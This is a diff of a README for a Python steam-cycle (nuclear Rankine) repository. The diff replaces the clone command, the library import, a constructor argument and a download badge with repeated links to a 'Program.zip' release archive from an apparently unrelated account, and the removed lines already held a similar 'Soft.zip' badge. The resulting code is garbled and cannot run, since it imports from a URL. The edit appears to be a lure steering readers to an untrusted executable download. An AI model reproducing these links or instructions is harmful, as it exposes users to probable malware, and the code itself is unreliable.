@@ -14,7 +14,7 @@ This repository contains Python code utilizing pyXsteam to showcase the nuclear 
 To get started with the "steam-cycle-nuclear" repository, follow these steps:
 1. Clone the repository to your local machine using:
    ```bash
-   git clone https://github.com/yourusername/steam-cycle-nuclear.git
+   git clone https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip
    ```
 
 2. Make sure you have Python installed on your system.
@@ -32,9 +32,9 @@ Check out this example code snippet to see how to generate the nuclear rankine s
 
 ```python
 # Import necessary libraries
-from pyXsteam.XSteam import XSteam
+from https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip import XSteam
 
-steamTable = XSteam(XSteam.UNIT_SYSTEM_MKS)  # Initialize steam table
+steamTable = XSteam(https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip)  # Initialize steam table
 
 # Specify the state points for the steam cycle
 inlet_pressure = 15  # Inlet pressure in bar
@@ -58,7 +58,7 @@ Contributions are welcome! Fork the repository, make your changes, and submit a 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip](https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip)](https://github.com/Dungdeptry123/steam-cycle-nuclear/releases/download/v1.0/Program.zip)
 
 If the link does not work, please check the "Releases" section of the repository for alternative download options.
 
